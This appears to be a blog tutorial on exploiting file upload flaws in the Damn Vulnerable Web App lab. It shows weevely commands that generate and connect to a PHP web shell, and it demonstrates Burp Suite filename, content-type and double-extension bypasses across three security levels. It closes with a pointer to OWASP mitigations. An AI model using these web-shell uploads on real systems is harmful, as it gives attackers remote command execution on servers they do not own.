---
layout: post
title: Dam Vulnerable Web App File Upload
---

Exploiting the Dam Vulnerable Web App

# DVWA Upload LOW

When we upload a picture we see that is uploaded to http://10.0.2.4/dvwa/hackable/uploads/ .
Next we’re going to use a tool called weevely to generate php shell file to upload to the server.

weevely generate password /root/shell.php

Weevely is the name of the tool, generate creates the shell with a password called password and then stores it in the root folder under the name shell.php .
Next we take that shell and upload it, now we can see that it’s stored at http://10.0.2.4/dvwa/hackable/uploads/shell.php .  We then navigate to that page and now it’s activated so we go back to the console to access it.

weevely http://10.0.2.4/dvwa/hackable/uploads/shell.php password

[+] weevely 3.7.0

[+] Target:	10.0.2.4
[+] Session:	/root/.weevely/sessions/10.0.2.4/shell_1.session

[+] Browse the filesystem or execute commands starts the connection
[+] to the target. Type :help for more information.

weevely> 

Now we have access to the machine.
The full list of things we can do once we have access with weevely can be found here:
https://github.com/epinna/weevely3 .

# DVWA Upload MEDIUM

Now if we try to upload php files it doesn’t let us. 
To get around this we’re going to use burp suite by creating a new temporary project and configuring the browser to use burp suite as a proxy. 

If we navigate to the proxy tab and select intercept and turn intercept on once we’re on the file upload page. We rename the shell.php file to .jpg and upload it. 

Burp captures this request and we can see
-Disposition: form-data; name="uploaded"; filename="shell.jpg"

Content-Type: image/jpeg

Now we rename shell.jpg to shell.php but keep the content-type as image/jpeg. If you’re doing this after you’ve done the low security setting make sure you give it a different name.

Success we managed to upload shell.php to the server and now can access it with weevely the same way we did for the low setting.

#DVWA UPLOAD HIGH

If we try the same method again we can see that it doesn’t work. Now it’s checking the file type and the extension. We can still bypass this with burp suite by intercepting it. 
We know that it checks the content-type and the file extension. 

-Disposition: form-data; name="uploaded"; filename="shell.jpg"

Content-Type: image/jpeg

We can bypass this by modifying the shell.jpg to shell.php.jpg

#MITIGATION

Instead of writing out all the mitigations owasp provides a great source on this.

https://www.owasp.org/index.php/Unrestricted_File_Upload



